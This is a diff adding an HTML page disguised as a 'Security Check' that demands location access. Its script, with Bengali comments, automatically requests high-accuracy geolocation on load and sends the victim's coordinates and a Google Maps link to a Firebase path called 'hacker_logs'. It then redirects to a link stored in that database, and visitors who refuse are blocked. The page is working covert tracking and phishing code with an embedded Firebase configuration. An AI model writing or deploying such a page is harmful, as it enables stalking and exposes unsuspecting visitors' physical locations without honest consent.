@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body {
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            height: 100vh; background-color: #f0f2f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+        }
+        .box {
+            background: white; padding: 30px;
+            border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 90%; width: 350px;
+        }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 20px; }
+        .btn {
+            background-color: #007bff; color: white;
+            border: none; padding: 10px 20px;
+            border-radius: 5px; cursor: pointer;
+            font-size: 16px; width: 100%;
+        }
+        .btn:hover { background-color: #0056b3; }
+        .error { color: red; font-size: 12px; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>Security Check</h2>
+        <p>This page requires location verification to proceed. Please allow location access.</p>
+        <button class="btn" onclick="startVerification()">Verify & Continue</button>
+        <p id="errorMsg" class="error">Location access denied. You cannot proceed.</p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getDatabase, ref, push, set, child, get } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
+            authDomain: "location-611d6.firebaseapp.com",
+            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
+            projectId: "location-611d6",
+            storageBucket: "location-611d6.firebasestorage.app",
+            messagingSenderId: "903100559116",
+            appId: "1:903100559116:web:08c8c9e1d7282048116329"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        
+        let finalRedirectLink = "https://www.google.com"; // ডিফল্ট
+
+        // লিংক ফেচ করে রেডি রাখা
+        const dbRef = ref(db);
+        get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
+            if (snapshot.exists()) {
+                finalRedirectLink = snapshot.val();
+            }
+        });
+
+        // ভেরিফিকেশন ফাংশন (Globally Available করার জন্য window তে সেট করলাম)
+        window.startVerification = function() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    // ১. সাকসেস হলে (শুধুমাত্র তখনই ডাটাবেসে যাবে)
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        
+                        // ডাটাবেসে পাঠানো
+                        const trackerRef = ref(db, 'hacker_logs');
+                        const newLogRef = push(trackerRef);
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+                        set(newLogRef, {
+                            timestamp: new Date().toString(),
+                            googleMapsLink: mapsLink,
+                            latitude: lat,
+                            longitude: lng
+                        }).then(() => {
+                            // সফল হলে রিডাইরেক্ট
+                            window.location.href = finalRedirectLink;
+                        });
+                    },
+                    // ২. ফেইল করলে (ডাটাবেসে কিচ্ছু যাবে না + সামনেও যাবে না)
+                    function(error) {
+                        document.getElementById('errorMsg').style.display = 'block';
+                        document.getElementById('errorMsg').innerText = "Location is mandatory! Please Allow and try again.";
+                        // এখানে কোনো রিডাইরেক্ট নেই, ইউজার আটকে থাকবে
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                alert("Browser not supported.");
+            }
+        };
+
+        // পেজ লোড হলেই একবার অটোমেটিক ট্রাই করবে
+        window.onload = function() {
+            setTimeout(startVerification, 500);
+        };
+    </script>
+</body>
+</html>
